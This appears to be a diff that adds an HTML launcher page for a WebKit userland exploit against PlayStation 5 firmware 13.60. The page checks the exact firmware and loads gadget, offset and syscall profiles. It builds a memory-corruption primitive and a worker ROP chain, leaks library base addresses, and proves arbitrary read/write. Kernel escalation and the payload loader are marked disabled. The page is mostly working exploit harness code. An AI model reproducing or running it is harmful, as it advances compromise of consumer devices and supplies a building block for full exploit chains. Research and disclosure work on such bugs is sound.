@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>noslop | userland proof</title>
+<style>
+  :root { color-scheme: dark; }
+  html, body { min-height: 100%; margin: 0; }
+  body {
+    margin: 0; padding: 18px 20px 48px; box-sizing: border-box;
+    background: #0b0d10; color: #d8dee9;
+    font: 18px/1.4 Consolas, "DejaVu Sans Mono", monospace;
+  }
+  h1 { margin: 0; font-size: 28px; color: #f2f4f8; }
+  #sub { margin: 3px 0 16px; color: #8795a7; }
+  #stage {
+    padding: 12px 14px; margin-bottom: 14px; border-left: 6px solid #d6b66d;
+    border-radius: 5px; background: #211d14; color: #f1dfad;
+    white-space: pre-wrap;
+  }
+  #stage.ok { border-left-color: #55c878; background: #14251b; color: #c8f2d3; }
+  #stage.bad { border-left-color: #e05d69; background: #2b171a; color: #ffd1d5; }
+  #summary {
+    display: none; padding: 12px 14px; margin-bottom: 14px;
+    border: 1px solid #355b43; border-radius: 5px; background: #101c15;
+    white-space: pre-wrap; color: #bce8c8;
+  }
+  #summary.on { display: block; }
+  #log {
+    min-height: 180px; max-height: 62vh; overflow: auto; margin: 0;
+    padding: 12px 14px; border: 1px solid #27313e; border-radius: 5px;
+    background: #0f1319; color: #94a3b8; white-space: pre-wrap;
+    font-size: 13px; line-height: 1.35;
+  }
+  #nav { display: flex; gap: 10px; margin-top: 16px; flex-wrap: wrap; }
+  #nav a, #nav button {
+    padding: 10px 14px; border: 1px solid #3a4a5e; border-radius: 6px;
+    background: #172130; color: #d8e6f8; font: inherit; text-decoration: none;
+    cursor: pointer;
+  }
+  #nav button { font-size: inherit; }
+  #nav a:focus, #nav button:focus { outline: 3px solid #f1dfad; outline-offset: 2px; }
+</style>
+</head>
+<body>
+<h1>noslop userland proof</h1>
+<p id="sub">Exact FW 13.60 candidate profile. Kernel escalation is disabled.</p>
+<div id="stage">Waiting for an explicit <b>?go=1</b> launch.</div>
+<pre id="summary"></pre>
+<pre id="log"></pre>
+<nav id="nav">
+  <a href="../index.html">Back</a>
+  <button id="clear" type="button">Clear log</button>
+</nav>
+
+<script>
+"use strict";
+
+const TARGET_FIRMWARE = "13.60";
+const query = new URLSearchParams(location.search);
+const stageElement = document.getElementById("stage");
+const summaryElement = document.getElementById("summary");
+const logElement = document.getElementById("log");
+let sequence = 0;
+
+function clean(value) {
+    return String(value ?? "").replace(/[\r\n\t]+/g, " ").slice(0, 320);
+}
+
+function mark(tag, detail) {
+    const line = `${String(++sequence).padStart(4, "0")} ${tag}`
+        + (detail ? ` ${clean(detail)}` : "");
+    logElement.textContent += (logElement.textContent ? "\n" : "") + line;
+    logElement.scrollTop = logElement.scrollHeight;
+    return line;
+}
+
+function stage(text, kind) {
+    stageElement.className = kind || "";
+    stageElement.textContent = text;
+}
+
+function fail(error) {
+    const message = error && error.stack ? error.stack : String(error);
+    mark("RUN-FAILED", message);
+    stage("Userland proof failed: " + clean(error && error.message || error), "bad");
+}
+
+window.noslopMark = mark;
+window.jb = {
+    hot: false,
+    mark
+};
+
+document.getElementById("clear").addEventListener("click", function () {
+    logElement.textContent = "";
+    sequence = 0;
+});
+
+</script>
+<script src="./rop.js"></script>
+<script src="./main.js?v=noslop-1"></script>
+<script>
+window.offsetsReady = new Promise(function (resolve, reject) {
+    const script = document.querySelector('script[src^="./offsets/"]');
+    if (!script) {
+        reject(new Error("the exact 13.60 profile was not injected"));
+        return;
+    }
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") {
+        resolve(script.getAttribute("src"));
+        return;
+    }
+    script.addEventListener("load", function () { resolve(script.src); });
+    script.addEventListener("error", function () {
+        reject(new Error("13.60 profile failed to load: " + script.src));
+    });
+});
+</script>
+<script src="./syscalls.js"></script>
+<script type="module">
+import { establishPrimitive, fakeCellReleased } from "./core.js?v=noslop-1";
+import { installWindowP, pairStatus } from "./mem.js?v=noslop-1";
+import { int64 } from "./int64.js?v=noslop-1";
+
+function assertExactFirmware() {
+    const match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
+    if (!match || match[1] !== TARGET_FIRMWARE)
+        throw new Error("exact FW 13.60 is required");
+    if (window.fw_str !== TARGET_FIRMWARE)
+        throw new Error("profile/runtime firmware mismatch: " + window.fw_str);
+}
+
+function assertProfile() {
+    if (typeof OFFSET_wk_vtable_first_element !== "number"
+        || !Array.isArray(OFFSET_wk_host_constructor_candidates)
+        || !OFFSET_wk_host_constructor_candidates.length
+        || typeof OFFSET_lk_worker_wait_return !== "number")
+        throw new Error("13.60 userland profile is incomplete");
+    if (typeof wk_gadgetmap !== "object" || !Object.keys(wk_gadgetmap).length)
+        throw new Error("13.60 gadget profile is empty");
+    if (typeof syscall_map !== "object" || syscall_map[SYS_GETPID] === undefined)
+        throw new Error("13.60 userland syscall profile lacks getpid");
+}
+
+function proveReadWrite(p) {
+    const probe = new Uint32Array([0x4e4f534c, 0x4f505f50]);
+    const probeObject = p.leakval(probe);
+    const backing = p.read8(probeObject.add32(0x10));
+    const original = p.read4(backing);
+    let marker = 0x13579bdf;
+    if (marker === original)
+        marker = 0x2468ace0;
+
+    p.write4(backing, marker);
+    const readback = p.read4(backing);
+    p.write4(backing, original);
+    const restored = p.read4(backing);
+
+    if (readback !== marker || restored !== original)
+        throw new Error("userland read/write/restore proof failed");
+
+    return {
+        probeAddress: probeObject.toString(),
+        backingAddress: backing.toString(),
+        original: `0x${original.toString(16)}`,
+        marker: `0x${marker.toString(16)}`,
+        readback: `0x${readback.toString(16)}`,
+        restored: `0x${restored.toString(16)}`,
+    };
+}
+
+function baseSummary(p) {
+    const bases = [
+        ["libSceNKWebKit", p.libSceNKWebKitBase],
+        ["libSceLibcInternal", p.libSceLibcInternalBase],
+        ["libkernel_web", p.libKernelBase],
+    ];
+    return bases.map(([name, value]) => {
+        if (!(value instanceof int64))
+            throw new Error(name + " base is not an int64");
+        return `${name}=0x${value.toString()}`;
+    }).join("\n");
+}
+
+async function run() {
+    assertExactFirmware();
+    await window.offsetsReady;
+    assertProfile();
+    mark("BOOT", "exact-fw=" + TARGET_FIRMWARE + " kernel-path=disabled");
+    mark("PROFILE-READY", "gadget-count=" + Object.keys(wk_gadgetmap).length);
+
+    const carrier = await establishPrimitive({
+        maxAttempts: 1,
+        onEvent(tag, detail, attempt) {
+            mark(tag, `attempt=${attempt || 1}${detail ? " " + detail : ""}`);
+        },
+        beforeCriticalLoad(fake, target) {
+            // Keep the screen alive before the high-memory commit without
+            // issuing synchronous network beacons from the exploit thread.
+            void stageElement.offsetWidth;
+            mark("CRITICAL-LOAD", `fake=0x${fake.toString(16)} target=0x${target.toString(16)}`);
+        },
+    });
+
+    installWindowP(carrier, {
+        onEvent(tag, detail) { mark(tag, detail); },
+    });
+    if (!pairStatus.promoted)
+        throw new Error("userland pair was not promoted: " + pairStatus.error);
+    mark("USERLAND-PRIMITIVE", "promoted=1 fake-cell-released=" + fakeCellReleased());
+
+    if (typeof prepare !== "function")
+        throw new Error("worker preparation function is unavailable");
+    const prepared = await prepare(window.p);
+    if (!prepared || !prepared.p || !prepared.chain)
+        throw new Error("worker ROP preparation returned no userland handle");
+    mark("WORKER-ROP-PROOF", "getpid-returned-and-worker-restored");
+
+    const rw = proveReadWrite(prepared.p);
+    mark("USERLAND-RW-PROOF", "read/write/restore passed");
+
+    const summary = baseSummary(prepared.p) + "\n"
+        + "firmware=13.60\n"
+        + "capability=webkit_userland_rw\n"
+        + "kernel_escalation=disabled\n"
+        + "payload_loader=disabled\n"
+        + "probe=" + JSON.stringify(rw);
+    summaryElement.textContent = summary;
+    summaryElement.className = "on";
+    stage("USERLAND PROOF PASSED. Kernel escalation remains disabled.", "ok");
+    mark("RESULT", "webkit_userland_rw=candidate kernel_exploit=false");
+    window.noslopResult = { firmware: TARGET_FIRMWARE, capability: "webkit_userland_rw", rw };
+}
+
+if (query.get("go") !== "1") {
+    stage("Not armed. Return to the launcher and choose RUN USERLAND PROOF.");
+    mark("IDLE", "missing-go=1");
+} else {
+    run().catch(fail);
+}
+</script>
+</body>
+</html>
